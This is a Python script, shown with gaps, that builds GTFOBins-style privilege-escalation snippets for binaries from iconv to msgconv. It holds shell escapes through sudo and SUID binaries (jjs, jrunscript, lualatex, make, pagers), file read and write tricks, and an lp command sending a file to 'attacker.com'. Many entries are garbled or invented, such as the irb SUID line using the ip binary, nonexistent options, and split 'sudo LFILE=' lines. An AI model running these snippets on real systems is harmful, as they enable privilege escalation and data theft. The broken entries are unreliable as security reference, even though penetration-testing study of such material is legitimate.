...
#Ignore the warning for the dosbox options when running the program! 
    ...
    elif zip_command == "iconv":
        if zip_options == "file-write":
            bins.append("LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which iconv) .\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("iconv -f utf-8 -t utf-8 <<< ""$(bash)""")

    elif zip_command == "iftop":
        if zip_options == "Shell":
            bins.append("iftop\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo iftop\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which iftop) .\n./iftop\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("iftop -t -s 1 -L 10 -i /path/to/file")
        elif zip_options == "file-write":
            bins.append("iftop -t -s 10 -L 20 > /path/to/output_file.txt")

    elif zip_command == "install":
        if zip_options == "suid":
            bins.append("sudo install -m =xs $(which install) .\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF")
        elif zip_options == "sudo":
    ...
    elif zip_command == "ionice":
        if zip_options == "Shell":
            bins.append("ionice /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ionice) .\n./ionice /bin/sh -p")
        elif zip_options == "sudo":
        ...
        if zip_options == "file-read":
            ...
            bins.append("sudo install -m =xs $(which ip) .\nLFILE=file_to_read\n./ip -force -batch ""$LFILE""")
        elif zip_options == "sudo":
        ...
        if zip_options == "Shell":
            ...
            bins.append("sudo irb\nexec '/bin/bash'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ip) .\n./irb\nexec '/bin/bash'")

    elif zip_command == "ispell":
        if zip_options == "Shell":
            bins.append("ispell /etc/passwd\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ispell) .\n./ispell /etc/passwd\n!/bin/sh -p")
        elif zip_options == "sudo":
            bins.append("sudo ispell /etc/passwd\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("ispell /path/to/file.txt")
        elif zip_options == "file-write":
            bins.append("ispell -b /path/to/input_file.txt > /path/to/output_file.txt")

    elif zip_command == "jjs":
        if zip_options == "Shell":
            bins.append("echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs")
        elif zip_options == "file-write":
            bins.append("echo 'var FileWriter = Java.type(""java.io.FileWriter"");\nvar fw=new FileWriter(""./file_to_write"");\nfw.write(""DATA"");\nfw.close();' | jjs")
        elif zip_options == "file-read":
            bins.append("echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");\nvar FileReader = Java.type(""java.io.FileReader"");\nvar br = new BufferedReader(new FileReader(""file_to_read""));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which jjs) .\necho ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs")
        elif zip_options == "sudo":
            bins.append("echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs")

    elif zip_command == "joe":
        if zip_options == "Shell":
            bins.append("joe\n^K!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo joe\n^K!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which joe) .\n./joe\n^K!/bin/sh")
        elif zip_options == "file-read":
            bins.append("joe filename.txt")
        elif zip_options == "file-write":
            bins.append("joe FILE_TO_WRITE")

    elif zip_command == "join":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\njoin -a 2 /dev/null $LFILE")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which join) .\nLFILE=file_to_read\n./join -a 2 /dev/null $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\njoin -a 2 /dev/null $LFILE")
        elif zip_options == "Shell":
            bins.append("join file1.txt file2.txt && bash")

    elif zip_command == "journalctl":
        if zip_options == "Shell":
            bins.append("journalctl\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo journalctl\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("journalctl --since ""DATE 12:00:00"" --until ""DATE 12:00:00""")
        elif zip_options == "file-write":
            bins.append("journalctl > output.log")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which journalctl) .\n./journalctl\n/bin/sh")

    elif zip_command == "jq":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\njq -Rr . ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which jq) .\nLFILE=file_to_read\n./jq -Rr . ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo jq -Rr . ""$LFILE""")
        elif zip_options == "Shell":
    ...
    elif zip_command == "jrunscript":
        if zip_options == "Shell":
            bins.append("jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""")
        elif zip_options == "file-write":
            ...
            bins.append("sudo install -m =xs $(which jrunscript) .\n./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""")
        elif zip_options == "sudo":
            bins.append("sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""")

    elif zip_command == "jtag":
        if zip_options == "Shell":
            bins.append("jtag --interactive\nshell /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo jtag --interactive\nshell /bin/sh")
        elif zip_options == "file-read":
            ...
            bins.append("sudo install -m =xs $(which jtag) .\n./jtag --interactive\nshell /bin/sh")

    elif zip_command == "julia":
        if zip_options == "Shell":
        ...
        if zip_options == "Shell":
            ...
            bins.append("sudo install -m =xs $(which ksh) .\n./ksh -p")
        elif zip_options == "sudo":
            bins.append("sudo ksh")

    elif zip_command == "ksshell":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nksshell -i $LFILE")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo ksshell -i $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ksshell) .\nLFILE=file_to_read\n./ksshell -i $LFILE")
        elif zip_options == "Shell":
            bins.append("%post --interpreter=/bin/bash -e; ksshell; end")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ksshell) .\n%post --interpreter=/bin/bash -e; ./ksshell; end")

    elif zip_command == "ksu":
        if zip_options == "sudo":
            bins.append("sudo ksu -q -e /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ksu) .\n./ksu -q -e /bin/sh")
        elif zip_options == "Shell":
            bins.append("ksu -l")
        elif zip_options == "file-read":
    ...
    elif zip_command == "logsave":
        if zip_options == "Shell":
            bins.append("logsave /dev/null /bin/sh -i")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which logsave) .\n./logsave /dev/null /bin/sh -i -p")
        elif zip_options == "sudo":
    ...
    elif zip_command == "look":
        if zip_options == "suid":
            bins.append("sudo install -m =xs $(which look) .\nLFILE=file_to_read\n./look '' ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nlook '' ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo look '' ""$LFILE""")
        ...
        if zip_options == "Shell":
            ...
            bins.append("sudo install -m =xs $(which ltrace) .\n./ltrace -b -L /bin/bash")

    elif zip_command == "lp":
        if zip_options == "file-write":
            bins.append("LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST")
        elif zip_options == "file-read":
        ...
        if zip_options == "Shell":
            ...
            bins.append("sudo install -m =xs $(which lua) .\nlua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'")
        elif zip_options == "sudo":
            bins.append("sudo lua -e 'os.execute(""/bin/sh"")'")

    elif zip_command == "lualatex":
        if zip_options == "Shell":
            bins.append("lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif zip_options == "sudo":
            bins.append("sudo lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which lualatex) .\n./lualatex -shell-escape '\ documentclass(article)\ begin(document)\directlua(os.execute(""/bin/sh""))\end(document)'")
        elif zip_options == "file-read":
            bins.append("lualatex script.tex")
        elif zip_options == "file-write":
            bins.append("echo 'SCRIPT' > script.tex\n lualatex script.tex")

    elif zip_command == "luatex":
        if zip_options == "Shell":
            bins.append("luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif zip_options == "sudo":
            bins.append("sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which luatex) .\n./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'")
        elif zip_options == "file-read":
            bins.append("luatex file.tex")
        elif zip_options == "file-write":
            bins.append("echo 'DATA' > file.tex\nluatex file.tex")
        
    elif zip_command == "lwp-download":
        if zip_options == "file-write":
            ...
            bins.append("sudo install -m =xs $(which lwp-download) .\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./lwp-download file: //$TF $LFILE")
        elif zip_options == "Shell":
            bins.append("lwp-download && bash")

    elif zip_command == "lwp-request":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nlwp-request ""file://$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo lwp-request ""file://$LFILE""")
        elif zip_options == "file-write":
            bins.append("echo ""DATA"" > LFILE\nlwp-request ""file://$LFILE""")
        elif zip_options == "Shell":
            bins.append("lwp-request ""file://$LFILE"" | bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which lwp-request) .\nLFILE=file_to_read\n./lwp-request ""file://$LFILE""")

    elif zip_command == "mail":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho ""From nobody@localhost $(date)"" > $TF\nmail -f $TF\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo mail --exec='!/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which mail) .\nTF=$(mktemp)\necho ""From nobody@localhost $(date)"" > $TF\n./mail -f $TF\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("mail -s 'DATA' nobody@localhost < filename.txt\ncat filename.txt")
        elif zip_options == "file-write":
            bins.append("mail -s 'DATA' nobody@localhost < filename.txt")

    elif zip_command == "make":
        if zip_options == "Shell":
            bins.append("COMMAND='/bin/sh'\nmake -s --eval=$'x:\n\t-'""$COMMAND""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nmake -s --eval=""\$(file >$LFILE,DATA)"" .")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which make) .\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\n\t-'""$COMMAND""")
        elif zip_options == "sudo":
            bins.append("COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\n\t-'""$COMMAND""")
        elif zip_options == "file-read":
            bins.append("echo 'DATA' makefile\nmake makefile")

    elif zip_command == "man":
        if zip_options == "Shell":
            bins.append("man man\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("man file_to_read")
        elif zip_options == "sudo":
            bins.append("sudo man man\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which man) .\n./man man\n!/bin/sh")
        elif zip_options == "file-write":
            bins.append("No GTFO bin available")

    elif zip_command == "mawk":
        if zip_options == "Shell":
            ...
            bins.append("sudo install -m =xs $(which mawk) .\nLFILE=file_to_read\n./mawk '//' ""$LFILE""")

    elif zip_command == "minicom":
        if zip_options == "Shell":
            bins.append("minicom -D /dev/null")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which minicom) .\n./minicom -D /dev/null")
        elif zip_options == "sudo":
    ...
    elif zip_command == "more":
        if zip_options == "Shell":
            bins.append("TERM= more /etc/profile\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("more file_to_read")
        elif zip_options == "file-write":
            bins.append("N/A")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which more) .\n./more file_to_read")
        elif zip_options == "sudo":
            bins.append("TERM= sudo more /etc/profile\n!/bin/sh")

    elif zip_command == "mosquitto":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nmosquitto -c ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which mosquitto) .\nLFILE=file_to_read\n./mosquitto -c ""$LFILE""")
        elif zip_options == "sudo":
    ...
    elif zip_command == "mount":
        if zip_options == "sudo":
            bins.append("sudo mount -o bind /bin/sh /bin/mount\nsudo mount")
        elif zip_options == "Shell":
            bins.append("N/A")
        elif zip_options == "suid":
            bins.append("N/A")
    ...
    elif zip_command == "msfconsole":
        if zip_options == "Shell":
            bins.append("sudo msfconsole\nmsf6 > irb\n>> system(""/bin/sh"")")
        elif zip_options == "sudo":
            bins.append("sudo msfconsole\nmsf6 > irb\n>> system(""/bin/sh"")")
        elif zip_options == "file-read":
            bins.append("N/A")
    ...
    elif zip_command == "msgattrib":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nmsgattrib -P $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which msgattrib) .\nLFILE=file_to_read\n./msgattrib -P $LFILE")
        elif zip_options == "sudo":
            bins.append("sudo LFILE=file_to_read\nmsgattrib -P $LFILE")
        elif zip_options == "file-write":
            bins.append("N/A")
    ...
    elif zip_command == "msgconv":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\nmsgconv -P $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which msgconv) .\nLFILE=file_to_read\n./msgconv -P $LFILE")
        elif zip_options == "sudo":
